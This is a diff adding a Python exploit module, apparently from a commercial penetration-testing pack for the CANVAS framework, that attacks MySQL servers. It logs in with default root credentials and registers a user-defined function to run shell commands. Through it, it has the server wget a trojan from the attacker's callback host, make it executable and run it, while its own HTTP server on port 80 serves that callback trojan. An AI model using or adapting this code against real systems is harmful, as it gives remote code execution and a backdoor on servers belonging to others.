@@ -1,0 +1,198 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+import os
+import getopt
+import sys
+import socket
+import struct
+import string
+import thread
+
+sys.path.append('.')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+import canvasengine
+from canvasexploit import canvasexploit
+from libs.spkproxy import header, body
+
+
+import libs.mysqllib as mysqllib
+
+
+NAME = 'd2sec_mysqlmosdef'
+DESCRIPTION='MySQL Mosdef'
+VERSION='0.1'
+
+DOCUMENTATION = {}
+DOCUMENTATION['VENDOR'] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION['Date public'] = ""
+DOCUMENTATION['References'] = "http://bernardodamele.blogspot.fr/2009/01/command-execution-with-mysql-udf.html"
+DOCUMENTATION['Versions Affected'] = ""
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = ""
+
+PROPERTY={}
+PROPERTY['TYPE']='Tools'
+PROPERTY['SITE']='Remote'
+PROPERTY['ARCH'] = [ ["Linux"] ]
+
+
+class theexploit(canvasexploit):
+
+  def __init__(self):
+    canvasexploit.__init__(self)
+    self.host = ''
+    self.user = "root"
+    self.passwd = "root"
+    self.port = 3306
+    self.timeout = 20
+    self.trojanname = "lnxmosdef"
+
+  def neededListenerTypes(self):
+    import canvasengine
+    return [canvasengine.UNIVERSAL_MOSDEF]
+
+  def maketrojan(self):
+    from libs.canvasos import canvasos
+    my_os = canvasos("Linux")
+    my_os.arch = 'X86'
+    self.log("[D2] Creating a callback to %s:%s"%(self.callback.ip, self.callback.port))
+    if not self.buildmosdeftrojan(self.callback.ip, self.callback.port, target_os=my_os, universal=True):
+      return 0
+    file(self.trojanname, "wb").write(self.mosdeftrojan)
+    ret = len(self.mosdeftrojan) != 0
+    return ret
+
+  def makesploit(self, clientheader, clientbody):
+    h = header('SERVER')
+    b = body()
+    self.maketrojan()
+    if clientheader.URL.count(self.trojanname):
+      self.log("[D2] Sending MOSDEF trojan")
+      f = open(self.trojanname, "rb")
+      sploitstring = f.read()
+      f.close()
+      os.remove(self.trojanname)
+      self.log("[D2] Sending %d bytes"%len(sploitstring))
+      h.addHeader("Content-type","binary/octet-stream")
+      h.addHeader("Connection","close")
+      b.setBody(sploitstring)
+    return h, b
+
+  def listen(self):
+    s=self.gettcplistener(80, "0.0.0.0")
+    if not s:
+      self.log("[D2] Cannot listen on port 80 - perhaps that port is already bound?")
+      return 0
+    s.set_timeout(5)
+    self.s=s
+    return s
+
+  def accept(self, s=None ):
+    if s==None:
+      s=self.s
+    try:
+      infd,addr=s.accept()
+    except timeoutsocket.Timeout:
+      return
+    if infd==-1:
+      return
+    self.handle(infd)
+    return True
+
+  def handle(self, infd):
+    self.log("[D2] Handling connection")
+    clientheader = header(state = "SERVER")
+    ret = clientheader.readdata(infd)
+    clientbody = body()
+    if clientheader.gotGoodHeader():
+      if clientheader.bodySize()>0 or clientheader.wasChunked:
+        self.log("[D2] Reading body")
+        clientbody.read(infd, clientheader.bodySize(), clientheader.wasChunked, 0)
+        self.log("[D2] Read body")
+    self.log("[D2] Creating exploit response")
+    servheader,servbody = self.makesploit(clientheader,clientbody)
+    self.log("[D2] Responding")
+    bodydata="".join(servbody.data)
+    response = ""
+    response += "%s %s %s\r\n"%(servheader.version, servheader.status, servheader.msg)
+    self.log(response)
+    for akey in servheader.headerValuesDict.keys():
+      if akey not in [ "Content-Length", "Content-length"]:
+        response += servheader.grabHeader(akey)
+    self.log("[D2] Sending header data of %d bytes"%len(response))
+    chunked=0
+    if not chunked:
+      response+="Content-Length: "+str(len(bodydata))+"\r\n"
+    response+="\r\n"
+    response+="".join(bodydata)
+    self.log("[D2] Total response length is %d bytes"%len(response))
+    try:
+      infd.sendall(response)
+    except socket.error:
+      self.log("[D2] Connection closed by peer")
+    self.log("[D2] Response sent")
+    infd.close()
+    return
+
+  def startHTTPServer(self):
+    s=self.listen()
+    if not s:
+      self.log("[D2] Failed to listen - not running")
+      return 0
+    while 1:
+      if self.state==self.HALT:
+        self.s.close()
+        break
+      self.accept()
+    self.setInfo("[D2] %s on %s:%d - done (success!)"%(NAME, self.bindip, self.port))
+    return 1
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get('port', self.port))
+    self.user = self.argsDict.get('user', self.user)
+    self.passwd = self.argsDict.get('passwd', self.passwd)
+
+  def run(self):
+    self.getargs()    
+    self.setInfo('[D2] %s attacking %s:%d (in progress)' % (NAME, self.host, self.port))
+    self.log('[D2] %s attacking %s:%d' % (NAME, self.host, self.port))
+    self.log("[D2] authenticate with %s/%s"%(self.user,self.passwd))    
+    thread.start_new_thread(self.startHTTPServer,())
+    try:      
+      m = mysqllib.MySQL(timeout=self.timeout)
+      m.connect((self.host, self.port))            
+      m.authenticate(self.user, self.passwd, "mysql")
+      m.query("USE mysql;")
+      m.query("DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;")
+      m.query("DROP FUNCTION IF EXISTS sys_eval;")
+      m.query("CREATE FUNCTION lib_mysqludf_sys_info RETURNS string SONAME 'lib_mysqludf_sys.so';")
+      m.query("CREATE FUNCTION sys_eval RETURNS string SONAME 'lib_mysqludf_sys.so';")
+      m.query("SELECT sys_eval('wget -O /dev/shm/"+self.trojanname+" http://"+self.callback.ip+"/"+self.trojanname+"&& chmod +x /dev/shm/"+self.trojanname+"&& /dev/shm/"+self.trojanname+"&& rm /tmp/"+self.trojanname+"')")
+      m.query("USE mysql;")
+      m.query("DROP FUNCTION IF EXISTS lib_mysqludf_sys_info;")
+      m.query("DROP FUNCTION IF EXISTS sys_eval;")
+    except Exception, e:
+      self.log("[D2] %s"%e)
+      self.setInfo('[D2] %s attacking %s:%d - failed' % (NAME, self.host, self.port))
+      return 0
+    self.log('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+    self.setInfo('[D2] %s attacking %s:%d - done' % (NAME, self.host, self.port))
+    return 1
+
+if __name__=='__main__':
+  print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
